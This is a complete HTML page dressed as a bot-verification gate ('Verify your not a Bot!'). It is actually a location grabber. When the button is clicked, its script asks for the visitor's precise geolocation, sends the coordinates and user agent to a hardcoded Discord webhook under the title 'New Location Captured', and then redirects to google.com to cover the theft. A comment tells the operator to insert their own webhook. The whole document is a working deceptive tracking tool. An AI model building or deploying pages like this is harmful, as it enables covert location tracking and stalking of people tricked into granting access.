<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Site Access</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;700&amp;display=swap');

        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0f172a, #1e3a8a);
            font-family: 'Inter', system-ui, sans-serif;
            overflow: hidden;
        }

        .container {
            text-align: center;
            max-width: 420px;
            padding: 40px 30px;
            background: rgba(255,255,255,0.05);
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.5);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255,255,255,0.1);
        }

        h1 {
            color: #60a5fa;
            margin: 0 0 12px;
            font-size: 28px;
            font-weight: 700;
        }

        p {
            color: #94a3b8;
            margin-bottom: 40px;
            line-height: 1.5;
        }

        #main-btn {
            background: linear-gradient(to right, #3b82f6, #1e40af);
            color: white;
            border: none;
            border-radius: 9999px;
            padding: 22px 60px;
            font-size: 24px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 10px 30px -10px #1e40af;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        #main-btn:hover {
            transform: translateY(-4px) scale(1.03);
            box-shadow: 0 20px 40px -10px #1e40af;
        }

        #main-btn:active {
            transform: scale(0.98);
        }

        .status {
            margin-top: 24px;
            font-size: 15px;
            color: #64748b;
            min-height: 24px;
        }

        .loading {
            display: none;
            align-items: center;
            justify-content: center;
            gap: 12px;
            color: #60a5fa;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #60a5fa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Click To Continue</h1>
        <p>Verify your not a Bot!</p>
        
        <button id="main-btn">Click To Go To Site</button>
        
        <div id="status" class="status">
            <div id="loading" class="loading">
                <div class="spinner"></div>
                <span>Loading..</span>
            </div>
        </div>
    </div>

    <script>
        const btn = document.getElementById('main-btn');
        const status = document.getElementById('status');
        const loading = document.getElementById('loading');

        // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
        // PUT YOUR DISCORD WEBHOOK URL HERE ↓
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476065111750738116/elR3mek4silfQHdlyhSizhv2h1_J5_tl0KQiI65U_l4LcTatOjCzWmdVKiI1IXheR-0q";
        // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←

        function sendToDiscord(lat, lon) {
            const payload = {
                embeds: [{
                    title: "✅ New Location Captured",
                    description: `**Latitude:** ${lat}\n**Longitude:** ${lon}`,
                    color: 0x3b82f6,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Location Grabber • " + navigator.userAgent.substring(0, 60)
                    }
                }]
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(() => {
                // Success → redirect to a real site (change this if you want)
                window.location.href = "https://google.com";
            }).catch(() => {
                status.innerHTML = `<span style="color:#f59e0b;">Location sent, but redirect failed.</span>`;
                setTimeout(() => window.location.href = "https://google.com", 1500);
            });
        }

        btn.addEventListener('click', () => {
            if (!WEBHOOK_URL.includes("YOUR_WEBHOOK")) {
                btn.style.opacity = "0.6";
                btn.style.pointerEvents = "none";
                loading.parentElement.style.display = "flex";
                status.style.display = "block";

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude.toFixed(6);
                        const lon = position.coords.longitude.toFixed(6);
                        sendToDiscord(lat, lon);
                    },
                    (error) => {
                        let msg = "Location access blocked.";
                        if (error.code === 1) msg = "Permission denied.";
                        if (error.code === 2) msg = "Position unavailable.";
                        status.innerHTML = `<span style="color:#ef4444;">${msg}</span>`;
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                alert("⚠️ You forgot to replace the WEBHOOK_URL in the code!");
            }
        });
    </script>
</body>
</html>
